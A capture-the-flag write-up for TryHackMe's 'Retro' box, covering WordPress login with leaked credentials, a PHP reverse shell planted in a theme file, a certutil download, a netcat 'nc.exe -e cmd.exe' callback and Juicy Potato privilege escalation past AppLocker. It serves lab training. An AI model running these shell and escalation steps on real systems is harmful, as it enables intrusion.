---
layout: default
title : RETRO - THM
---
![Screenshot_20220412_165805](https://user-images.githubusercontent.com/24994796/162995378-4a26c32d-9b87-4c83-8fc6-708e12e2d0c7.png)

# Less chatting more hacking 🤤
Let's jump right into it 

Here were working with a retro arcade, games and all that let's see what it's all about .......

Upon firing up the machine we get an IP address

# Enumeration

First thing for every good security operative is enumeration
so we run an nmap scan to know which ports/services are up and running
![Screenshot_20220411_182142](https://user-images.githubusercontent.com/24994796/163006580-65d9d551-6f35-4a59-9fd7-09db4d275494.png)

We see there's  only two ports running 
Port 80 and 3389
That's
- http and rdp
- It's Good Practice to enumerate as much as you can
Running ffuf on the http service we get to know there's a sub-directory
![Screenshot_20220411_182124](https://user-images.githubusercontent.com/24994796/163007689-28031384-a937-4854-b0aa-e4af24cd3d0c.png)
You can run ffuf recursively or do it as i did
Heading to the retro directory we see it's a site for games and the likes
![Wade](https://user-images.githubusercontent.com/24994796/163008064-ed7094a8-5744-43fe-bb30-74e4fb075302.png)
In our scans and checking the source code we see it's CMS is wordpress 5.2.1
Head over to the log in page (bottom of the website)
We're Greeted with a thpical wordpress login page
All we need is User credentials 
Checking the source code we notice a comment link
![Screenshot_20220411_184823](https://user-images.githubusercontent.com/24994796/163009443-8e22a36c-66d3-4a95-b1fb-49f3a7c8d024.png)
Heading to the comment link we get this
![Screenshot_20220411_181132](https://user-images.githubusercontent.com/24994796/163009624-63e36c55-b118-45fa-9b81-ea35ccaead9e.png)
So We can guess the User name is wade and you can try the password from the gotten comment 
Logging in we're greeted with a dashboard
![Screenshot_20220411_181956](https://user-images.githubusercontent.com/24994796/163010214-63310cf3-2f1a-47ff-a75f-f13f564420b8.png)

# Exploitation

We can upload an RCE to wordpress CMS we just have to place it well
Your regular pentest monkey rev-shell won't work (didn't work for me)
So let's go for Rev-shell 2.5
![Screenshot_20220411_191305](https://user-images.githubusercontent.com/24994796/163010783-3e807405-c3c0-446a-9ee6-93b67be4e223.png)
[LINK TO THE REV](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)
Replace the archive.php file
![Screenshot_20220411_221725](https://user-images.githubusercontent.com/24994796/163014318-fe41e4f9-48b6-4897-9710-0f54e670ad66.png)
- Change the ip and port at the bottom of the script  
- start a nc listener 'rlwrap nc -lvnp $port"
- navigate to the archive.php "http://10.10.149.150/retro/wp-content/themes/90s-retro/archive.php"
- Remember Change the IP 😴

![Screenshot_20220411_191216(1)](https://user-images.githubusercontent.com/24994796/163015617-adf3ddb7-f8d2-486f-a563-f4a697091fa4.png)
We're in 😎
- First thing first enumeration
- who are we ?
- What are our Privileges ?

# Seeing SeImpersonate.... is Enabled we can use Juicy Potato for PrivEsc
- Get juicy potato, netcat binary
- Host it on your machine
- Download it in the victim machine(certutil -urlcache -f attacking-ip:port/file file)
Pls note there could be an applocker on windows, In our case there is cos if you try running the exe file you'll get a shell that's stuck 
To avoid that download the exe files and do everything you want to do in the applocker whitelisted path "C:\Windows\System32\spool\drivers\color"
![Screenshot_20220411_213900](https://user-images.githubusercontent.com/24994796/163017202-6638c509-89fa-4fa0-9155-0b91d7cdc067.png)

![Screenshot_20220411_213845](https://user-images.githubusercontent.com/24994796/163017351-98358b37-5a8b-452e-865e-316f8de599ac.png)
So yh everthing seems good 
So now we create a bat file "echo C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe  IP 1515 > reverse.bat"
![Screenshot_20220411_220833](https://user-images.githubusercontent.com/24994796/163017697-95b0f283-9feb-4b10-8ef1-ac868694f249.png)
Running "wmic Service get name,displayname,pathname,startmode" gives us a list of running services
Choosing a CLISD
[Juicy Potato CLISD](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard/)

Start a netcat listener in a new tab on your machine with the port in the bat file
![Screenshot_20220411_220833](https://user-images.githubusercontent.com/24994796/163018886-290fc5c7-253c-4b07-9f66-198cada7241a.png)

![Screenshot_20220411_220856](https://user-images.githubusercontent.com/24994796/163018998-413404c0-8037-4008-896d-9ecdacede93a.png)

# AND WE ARE DONE
LOOK FOR FILES ON YOUR OWN, it's your little task

Hit me up on [Twitter](https://twitter.com/abdulmalik_ttg) if you run into any issues



<br> <br>
[Back To Home](../../index.md)
<br>
